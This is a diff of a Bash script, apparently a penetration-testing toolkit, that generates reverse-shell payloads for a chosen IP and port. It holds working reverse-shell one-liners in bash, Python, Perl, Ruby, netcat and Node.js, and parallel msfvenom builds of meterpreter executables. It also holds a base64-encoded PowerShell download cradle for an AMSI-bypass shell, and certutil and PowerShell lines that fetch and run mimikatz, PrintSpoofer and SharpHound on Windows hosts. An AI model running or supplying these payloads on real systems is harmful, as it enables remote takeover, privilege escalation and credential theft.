@@ -10,61 +10,67 @@ localnic=${1:-}
 localport=${2:-}
 BESTAND=${3:-}
 
-
-echo "[*] Incompentent Bastard v${VERSIE}"
-
+echo "[*] Incompetent Bastard v${VERSIE}"
 
 if [ -z "$BESTAND" ]; then
   BESTAND='shell'
 fi
 
 if [ -z "$localnic" ]; then
-
-
-
   echo "Incompetent Bastard reverseshells.sh
 
 Excessive handcrafted reverse shells with love and minimal care...
 
 Generates some reverse shells, macro's and a txt file for some good ol copy paste.
-Currently default's to port ${PORT} you. Change this by giving the port als a second option.
+Currently default's to port ${PORT}. Change this by giving the port as a second option.
 You'll find the generated shells and the textfile ${BESTAND}_${PORT} in the directory payloads.
 
 usage (with port ${PORT}):
-./reverseshell.sh eth0
+./reverseshells.sh eth0
 or (with port 4444)
-./reverseshell.sh eth0 4444
+./reverseshells.sh eth0 4444
 or (with IP)
-./reverseshell.sh 127.0.1.2 4444
+./reverseshells.sh 127.0.1.2 4444
 "
-
   echo "[!] You failed..."
-  exit;
+  exit 1
 fi
 
-if [ "$localport" == $RE ]; then
+# Poortvalidatie vóór IP-bepaling
+if [[ "$localport" =~ $RE ]]; then
   PORT=$localport
 fi
 
+mkdir -p http/payloads/ http/commands/
 
-mkdir -p payloads/
-
-#todo: move this to globalmeuk.sh
+# IP bepalen uit interface of direct gebruiken
 if [[ $localnic =~ ^[a-z](.*)$ ]]; then
-  # we hebben een tun of eth?
+  # Interface naam meegegeven (eth0, tun0, ...)
   if [[ "$OSTYPE" == "darwin"* ]]; then
-    IP=$(ip -4 addr list "$1" | grep inet |  awk '{print $2}' | cut -d/ -f1);
+    IP=$(ip -4 addr list "$localnic" | grep inet | awk '{print $2}' | cut -d/ -f1)
   else
-    IP=$(/sbin/ip -o -4 addr list $localnic | awk '{print $4}' | cut -d/ -f1);
+    IP=$(/sbin/ip -o -4 addr list "$localnic" | awk '{print $4}' | cut -d/ -f1)
   fi
 else
-  # blijkbaar een IP
+  # Direct IP meegegeven
   IP=$localnic
+fi
+
+if [ -z "$IP" ]; then
+  echo "[!] Kon geen IP bepalen van '${localnic}'" >&2
+  exit 1
 fi
 
 
 echo "[+] Take your time for some excessive handcrafted reverse shells with love and minimal care for ${IP} on port ${PORT}"
-#curl "http://127.0.0.1/dashboard/zet_ip/${IP}"
+
+# Auto-update dashboard LHOST als het draait
+if curl -s --max-time 2 "http://127.0.0.1/api/settings" -o /dev/null 2>/dev/null; then
+  curl -s -X POST "http://127.0.0.1/api/settings" \
+    -H "Content-Type: application/json" \
+    -d "{\"localhost\":\"http://${IP}\"}" -o /dev/null
+  echo "[+] Dashboard LHOST ingesteld op http://${IP}"
+fi
 echo "[.] Now baking BASH reverse TCP shells..."
 echo '# Incompetent Bastard' > http/payloads/${BESTAND}_${PORT}.txt
 echo 'Excessive handcrafted reverse shells with love and minimal care.' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -94,6 +100,11 @@ echo 'python -c '"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SO
 echo 'python -c '"'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"${IP}\",${PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'python -c '"'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"${IP}\",${PORT}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"''  >> http/payloads/${BESTAND}_${PORT}.txt
 
+echo '# PYTHON3' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${IP}\",${PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${IP}\",${PORT}));[os.dup2(s.fileno(),f)for f in[0,1,2]];pty.spawn(\"bash\")'" >> http/payloads/${BESTAND}_${PORT}.txt
+
 echo '# PERL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'perl -e '"'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'perl -MIO -e '"'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -102,23 +113,87 @@ echo '# RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt
 
+echo '# NETCAT' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "nc -e /bin/sh ${IP} ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "ncat -e /bin/sh ${IP} ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "busybox nc ${IP} ${PORT} -e /bin/sh" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f" >> http/payloads/${BESTAND}_${PORT}.txt
+
+echo '# NODE.JS' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(${PORT},'${IP}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "node -e \"var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(${PORT},'${IP}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});\"" >> http/payloads/${BESTAND}_${PORT}.txt
+
 echo '# MSFVENOM' >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > http/payloads/${BESTAND}_${PORT}.exe
-echo "${BESTAND}_${PORT}.exe :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/${BESTAND}_${PORT}.elf
-echo "${BESTAND}_${PORT}.elf :: linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf " >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meterpreter_${PORT}.elf
-echo "meterpreter_${PORT}.elf :: linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meter64_${PORT}.elf
-echo "meter64_${PORT}.elf :: linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
-#msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
-#echo "${BESTAND}_${PORT}.macho :: osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" >> http/payloads/${BESTAND}_${PORT}.txt
-#msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
-#echo "${BESTAND}_${PORT}.asp :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.jsp
-echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
-echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war" >> http/payloads/${BESTAND}_${PORT}.txt
+if command -v msfvenom &>/dev/null; then
+  echo "[.] msfvenom payloads parallel genereren..."
+
+  # Alle msfvenom calls parallel uitvoeren
+  (msfvenom -p windows/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f exe \
+    > http/payloads/${BESTAND}_${PORT}.exe 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.exe :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom windows/shell_reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p linux/x86/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f elf \
+    > http/payloads/${BESTAND}_${PORT}.elf 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.elf :: linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom linux/x86/shell_reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f elf \
+    > http/payloads/meterpreter_${PORT}.elf 2>/dev/null \
+    && echo "meterpreter_${PORT}.elf :: linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom linux/x86/meterpreter/reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f elf \
+    > http/payloads/meter64_${PORT}.elf 2>/dev/null \
+    && echo "meter64_${PORT}.elf :: linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom linux/x64/meterpreter/reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p java/jsp_shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f raw \
+    > http/payloads/${BESTAND}_${PORT}.jsp 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom java/jsp_shell_reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p java/jsp_shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f war \
+    > http/payloads/${BESTAND}_${PORT}.war 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom java/jsp_shell_reverse_tcp war mislukt" >&2) &
+
+  (msfvenom -p linux/x64/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f elf \
+    > http/payloads/${BESTAND}_x64_${PORT}.elf 2>/dev/null \
+    && echo "${BESTAND}_x64_${PORT}.elf :: linux/x64/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom linux/x64/shell_reverse_tcp mislukt" >&2) &
+
+  (msfvenom -p windows/x64/meterpreter/reverse_https LHOST="${IP}" LPORT="${PORT}" -f exe \
+    > http/payloads/meth_https_${PORT}.exe 2>/dev/null \
+    && echo "meth_https_${PORT}.exe :: windows/x64/meterpreter/reverse_https LHOST=${IP} LPORT=${PORT} -f exe" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom windows/x64/meterpreter/reverse_https mislukt" >&2) &
+
+  (msfvenom -p windows/x64/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f asp \
+    > http/payloads/${BESTAND}_${PORT}.asp 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.asp :: windows/x64/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom windows/x64/shell_reverse_tcp asp mislukt" >&2) &
+
+  (msfvenom -p osx/x64/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f macho \
+    > http/payloads/${BESTAND}_${PORT}.macho 2>/dev/null \
+    && echo "${BESTAND}_${PORT}.macho :: osx/x64/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom osx/x64/shell_reverse_tcp mislukt" >&2) &
+
+  wait
+  echo "[.] msfvenom payloads klaar"
+else
+  echo "[!] msfvenom niet gevonden — msfvenom payloads overgeslagen" >&2
+  echo "# msfvenom niet beschikbaar" >> http/payloads/${BESTAND}_${PORT}.txt
+fi
 #msfvenom -p payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/tcp${BESTAND}_${PORT}.py
 #echo "tcp${BESTAND}_${PORT}.py :: payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
 #msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
@@ -129,11 +204,11 @@ echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${P
 
 
 echo '# MSF handlers command.sh' >> http/payloads/${BESTAND}_${PORT}.txt
-echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
-echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
-echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
-echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT 8080 \n run -j;" > http/commands/msfshell_tcp8080
-echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msfshell_tcp
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${IP}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${IP}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${IP} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
+echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${IP} \n set LPORT 8080 \n run -j;" > http/commands/msfshell_tcp8080
+echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${IP} \n set LPORT ${PORT} \n run -j;" > http/commands/msfshell_tcp
 echo 'Payload windows/x64/meterpreter_https' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh metasploit msf_https8080' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh metasploit msf_https' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -146,8 +221,17 @@ echo "[.] Building the prefered shells :)"
 echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
 
+# PowerShell base64-encoded download cradle
+PS_CRADLE="IEX(New-Object Net.WebClient).DownloadString('http://${IP}/payloads/amsi-shell.ps1')"
+PS_B64=$(printf '%s' "${PS_CRADLE}" | iconv -t utf-16le 2>/dev/null | base64 | tr -d '\n')
+if [ -n "${PS_B64}" ]; then
+  echo "powershell -enc ${PS_B64}" >> http/payloads/${BESTAND}_${PORT}.txt
+  echo "powershell -enc ${PS_B64}" > http/commands/ps_cradle_b64
+fi
 
-python3 powershell.py ${IP} ${PORT} hatseflatsj windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt
+python3 powershell.py "${IP}" "${PORT}" hatseflatsj windows/x64/meterpreter/reverse_tcp \
+  "http/payloads/${BESTAND}_${PORT}.txt" \
+  || echo "[!] powershell.py mislukt" >&2
 
 
 
@@ -155,9 +239,9 @@ echo '## PrinSpoofer64.exe ' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
 echo './command.sh [screenname] printspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspoofer
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/psprintspooferrun
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300\"" > http/commands/psprintspoofer
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300; c:\windows\tasks\print.exe -i -c cmd\"" > http/commands/psprintspooferrun
 echo './command.sh [screenname] psprintspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh [screenname] psprintspooferrun' >> http/payloads/${BESTAND}_${PORT}.txt
 
@@ -165,17 +249,17 @@ echo '## MimiKatz.exe' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
 echo './command.sh [screenname] mimikatz' >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/mimi/mimikatz.exe' -OutFile 'c:\windows\tasks\mimi.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/mimi/mimikatz.exe' -OutFile 'c:\windows\tasks\mimi.exe' -TimeoutSec 300\"" > http/commands/psmimikatz
 echo './command.sh [screenname] psmimikatz' >> http/payloads/${BESTAND}_${PORT}.txt
 
 echo '## SharpHound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
 echo './command.sh [screenname] sharphound' >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe --CollectionMethods All" > http/commands/pssharphoundrun
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/SharpHound.exe' -OutFile 'c:\windows\tasks\sharphound.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/SharpHound.exe' -OutFile 'c:\windows\tasks\sharphound.exe' -TimeoutSec 300\"" > http/commands/pssharphound
+echo "powershell -c \"iwr -Uri 'http://${IP}/tools/SharpHound.exe' -OutFile 'c:\windows\tasks\sharphound.exe' -TimeoutSec 300; c:\windows\tasks\sharphound.exe --CollectionMethods All\"" > http/commands/pssharphoundrun
 echo './command.sh [screenname] pssharphound' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh [screenname] pssharphoundrun' >> http/payloads/${BESTAND}_${PORT}.txt
 
@@ -184,24 +268,24 @@ echo "## windows/x64/meterpreter TCP  ${PORT}" >> http/payloads/${BESTAND}_${POR
 
 
 echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/shell_meth.exe' -OutFile 'c:\windows\tasks\meth.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/shell_meth.exe' -OutFile 'c:\windows\tasks\meth.exe' -TimeoutSec 300; c:\windows\tasks\meth.exe\"" > http/commands/psmethrun
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
 echo './command.sh [screenname] certutilmeth' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh [screenname] psmethrun' >> http/payloads/${BESTAND}_${PORT}.txt
 
 echo '## windows/x64/meterpreter TCP  8080' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/payloads/meth8080.exe meth8080.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\tasks\meth8080.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe')" > http/commands/psmeth8080
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun8080run
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/meth8080.exe' -OutFile 'c:\windows\tasks\meth8080.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/meth8080.exe' -OutFile 'c:\windows\tasks\meth8080.exe' -TimeoutSec 300\"" > http/commands/psmeth8080
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/meth8080.exe' -OutFile 'c:\windows\tasks\meth8080.exe' -TimeoutSec 300; c:\windows\tasks\meth8080.exe\"" > http/commands/psmethrun8080run
 
 
 echo "## windows/x64/reverse_tcp TCP ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/payloads/methtcp.exe methtcp.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\tasks\methtcp.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe')" > http/commands/psmethtcp
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\methtcp.exe" > http/commands/psmethtcprun
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/methtcp.exe' -OutFile 'c:\windows\tasks\methtcp.exe' -TimeoutSec 300\"" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/methtcp.exe' -OutFile 'c:\windows\tasks\methtcp.exe' -TimeoutSec 300\"" > http/commands/psmethtcp
+echo "powershell -c \"iwr -Uri 'http://${IP}/payloads/methtcp.exe' -OutFile 'c:\windows\tasks\methtcp.exe' -TimeoutSec 300; c:\windows\tasks\methtcp.exe\"" > http/commands/psmethtcprun
 echo './command.sh [screenname] psmethtcp' >> http/payloads/${BESTAND}_${PORT}.txt
 echo './command.sh [screenname] psmethtcprun' >> http/payloads/${BESTAND}_${PORT}.txt
 
@@ -270,39 +354,91 @@ echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
 
 
 echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 invoke-shellcode.py ${IP} ${PORT}
+python3 invoke-shellcode.py "${IP}" "${PORT}" \
+  || echo "[!] invoke-shellcode.py mislukt" >&2
 
 
 #echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
 
 echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
 echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 meterpreter.py ${IP} ${PORT}
-cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe
+python3 meterpreter.py "${IP}" "${PORT}" \
+  || echo "[!] meterpreter.py (https/${PORT}) mislukt" >&2
+if [ -f "meuk/meth/bin/Debug/meth.exe" ]; then
+  cp meuk/meth/bin/Debug/meth.exe "http/payloads/${BESTAND}_meth.exe"
+else
+  echo "[!] meth.exe niet gevonden - msbuild compilatie mislukt?" >&2
+fi
 
 echo '#METERPRETER (reverse_https) on port 8080' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 meterpreter.py ${IP} 8080
-cp meuk/meth/bin/Debug/meth.exe http/payloads/meth8080.exe
-
+python3 meterpreter.py "${IP}" 8080 \
+  || echo "[!] meterpreter.py (https/8080) mislukt" >&2
+if [ -f "meuk/meth/bin/Debug/meth.exe" ]; then
+  cp meuk/meth/bin/Debug/meth.exe http/payloads/meth8080.exe
+else
+  echo "[!] meth.exe niet gevonden - msbuild compilatie mislukt?" >&2
+fi
 
 echo "[+] Generate METH reverse TCP payload for ${IP} on port ${PORT}"
-python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
-cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
-
+python3 meterpreter.py "${IP}" "${PORT}" windows/x64/shell_reverse_tcp \
+  || echo "[!] meterpreter.py (tcp/${PORT}) mislukt" >&2
+if [ -f "meuk/meth/bin/Debug/meth.exe" ]; then
+  cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
+else
+  echo "[!] meth.exe niet gevonden - msbuild compilatie mislukt?" >&2
+fi
 
